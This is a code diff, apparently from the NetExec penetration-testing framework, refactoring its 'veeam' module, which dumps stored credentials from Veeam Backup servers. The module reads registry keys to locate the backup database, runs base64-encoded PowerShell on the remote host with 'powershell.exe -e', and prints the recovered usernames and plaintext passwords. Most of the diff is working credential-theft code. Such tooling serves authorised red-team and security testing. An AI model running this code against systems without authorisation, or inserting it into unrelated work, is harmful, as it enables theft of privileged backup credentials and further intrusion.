@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 # Initially created by @sadshade, all output to him:
 # https://github.com/sadshade/veeam-output
 
@@ -12,9 +10,7 @@ from nxc.helpers.powershell import get_ps_script
 
 
 class NXCModule:
-    """
-    Module by @NeffIsBack, @Marshall-Hallenbeck
-    """
+    """Module by @NeffIsBack, @Marshall-Hallenbeck"""
 
     name = "veeam"
     description = "Extracts credentials from local Veeam SQL Database"
@@ -23,16 +19,13 @@ class NXCModule:
     multiple_hosts = True
 
     def __init__(self):
-        with open(get_ps_script("veeam_dump_module/veeam_dump_mssql.ps1"), "r") as psFile:
+        with open(get_ps_script("veeam_dump_module/veeam_dump_mssql.ps1")) as psFile:
             self.psScriptMssql = psFile.read()
-        with open(get_ps_script("veeam_dump_module/veeam_dump_postgresql.ps1"), "r") as psFile:
+        with open(get_ps_script("veeam_dump_module/veeam_dump_postgresql.ps1")) as psFile:
             self.psScriptPostgresql = psFile.read()
 
     def options(self, context, module_options):
-        """
-        No options
-        """
-        pass
+        """No options"""
 
     def checkVeeamInstalled(self, context, connection):
         context.log.display("Looking for Veeam installation...")
@@ -56,7 +49,7 @@ class NXCModule:
 
             # Veeam v12 check
             try:
-                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations",)
+                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations")
                 keyHandle = ans["phkResult"]
 
                 database_config = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlActiveConfiguration")[1].split("\x00")[:-1][0]
@@ -64,16 +57,16 @@ class NXCModule:
                 context.log.success("Veeam v12 installation found!")
                 if database_config == "PostgreSql":
                     # Find the PostgreSql installation path containing "psql.exe"
-                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\PostgreSQL Global Development Group\\PostgreSQL",)
+                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\PostgreSQL Global Development Group\\PostgreSQL")
                     keyHandle = ans["phkResult"]
                     PostgreSqlExec = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "Location")[1].split("\x00")[:-1][0] + "\\bin\\psql.exe"
 
-                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\PostgreSQL",)
+                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\PostgreSQL")
                     keyHandle = ans["phkResult"]
                     PostgresUserForWindowsAuth = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "PostgresUserForWindowsAuth")[1].split("\x00")[:-1][0]
                     SqlDatabaseName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName")[1].split("\x00")[:-1][0]
                 elif database_config == "MsSql":
-                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\MsSql",)
+                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\MsSql")
                     keyHandle = ans["phkResult"]
 
                     SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName")[1].split("\x00")[:-1][0]
@@ -88,7 +81,7 @@ class NXCModule:
 
             # Veeam v11 check
             try:
-                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication",)
+                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication")
                 keyHandle = ans["phkResult"]
 
                 SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName")[1].split("\x00")[:-1][0]
@@ -102,9 +95,6 @@ class NXCModule:
             except Exception as e:
                 context.log.fail(f"UNEXPECTED ERROR: {e}")
                 context.log.debug(traceback.format_exc())
-
-        except NotImplementedError as e:
-            pass
         except Exception as e:
             context.log.fail(f"UNEXPECTED ERROR: {e}")
             context.log.debug(traceback.format_exc())
@@ -126,14 +116,14 @@ class NXCModule:
 
     def stripXmlOutput(self, context, output):
         return output.split("CLIXML")[1].split("<Objs Version")[0]
-    
+
     def executePsMssql(self, context, connection, SqlDatabase, SqlInstance, SqlServer):
         self.psScriptMssql = self.psScriptMssql.replace("REPLACE_ME_SqlDatabase", SqlDatabase)
         self.psScriptMssql = self.psScriptMssql.replace("REPLACE_ME_SqlInstance", SqlInstance)
         self.psScriptMssql = self.psScriptMssql.replace("REPLACE_ME_SqlServer", SqlServer)
         psScipt_b64 = b64encode(self.psScriptMssql.encode("UTF-16LE")).decode("utf-8")
 
-        return connection.execute("powershell.exe -e {} -OutputFormat Text".format(psScipt_b64), True)
+        return connection.execute(f"powershell.exe -e {psScipt_b64} -OutputFormat Text", True)
 
     def executePsPostgreSql(self, context, connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName):
         self.psScriptPostgresql = self.psScriptPostgresql.replace("REPLACE_ME_PostgreSqlExec", PostgreSqlExec)
@@ -141,7 +131,7 @@ class NXCModule:
         self.psScriptPostgresql = self.psScriptPostgresql.replace("REPLACE_ME_SqlDatabaseName", SqlDatabaseName)
         psScipt_b64 = b64encode(self.psScriptPostgresql.encode("UTF-16LE")).decode("utf-8")
 
-        return connection.execute("powershell.exe -e {} -OutputFormat Text".format(psScipt_b64), True)
+        return connection.execute(f"powershell.exe -e {psScipt_b64} -OutputFormat Text", True)
 
     def printCreds(self, context, output):
         # Format output if returned in some XML Format
@@ -159,12 +149,18 @@ class NXCModule:
             context.log.fail(output_stripped[0])
             return
 
-        for account in output_stripped:
-            user, password = account.split(" ", 1)
-            password = password.replace("WHITESPACE_ERROR", " ")
-            context.log.highlight(user + ":" + f"{password}")
-            if ' ' in password:
-                context.log.fail(f"Password contains whitespaces! The password for user \"{user}\" is: \"{password}\"")
+        # When powershell returns something else than the usernames and passwords account.split() will throw a ValueError.
+        # This is likely an error thrown by powershell, so we print the error and the output for debugging purposes.
+        try:
+            for account in output_stripped:
+                user, password = account.split(" ", 1)
+                password = password.replace("WHITESPACE_ERROR", " ")
+                context.log.highlight(f"{user}:{password}")
+                if " " in password:
+                    context.log.fail(f'Password contains whitespaces! The password for user "{user}" is: "{password}"')
+        except ValueError:
+            context.log.fail(f"Powershell returned unexpected output: {output_stripped}")
+            context.log.fail("Please report this issue on GitHub!")
 
     def on_admin_login(self, context, connection):
         self.checkVeeamInstalled(context, connection)
